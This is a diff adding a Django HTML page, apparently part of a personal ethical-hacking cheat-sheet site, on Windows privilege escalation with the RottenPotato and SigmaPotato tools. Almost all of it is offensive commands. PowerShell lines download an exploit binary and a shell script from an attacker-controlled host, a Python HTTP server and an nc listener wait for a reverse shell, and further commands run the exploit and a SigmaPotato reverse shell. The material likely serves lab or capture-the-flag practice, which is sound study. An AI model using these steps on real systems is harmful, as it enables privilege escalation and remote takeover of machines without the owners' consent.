@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>MSFRottenPotato</h1>
+    <h2 class="blue">Serve malicious files</h2>
+    <div class="code-box"><pre><code>(new-object net.webclient).downloadfile('http://10.10.16.38:8000/MSFRottenPotato.exe', 'C:\users\merlin\appdata\local\temp\RottenPotato.exe')
+(new-object net.webclient).downloadfile('http://10.10.16.38:8000/shell.bat', 'C:\users\merlin\appdata\local\temp\shell.bat')</code></pre></div>
+
+<h2 class="blue">Prepare http server to serve shell.ps1 file and accept reverse shell.</h2>
+<div class="code-box"><pre><code>python3 -m http.server 8000
+nc -lvnp 4444</code></pre></div>
+<h2 class="blue">Execute</h2>
+<div class="code-box"><pre><code> C:\users\merlin\appdata\local\temp\RottenPotato.exe * C:\users\merlin\appdata\local\temp\shell.bat</code></pre></div>
+
+<h1>SigmaPotato</h1>
+<p class="text">More info : <a href="https://github.com/tylerdotrar/SigmaPotato">HERE</a></p>
+<h2 class="blue">RevShell</h2>
+<div class="code-box"><pre><code>./SigmaPotato.exe --revshell <ip_addr> <port></code></pre></div>
+</body>
+</html>
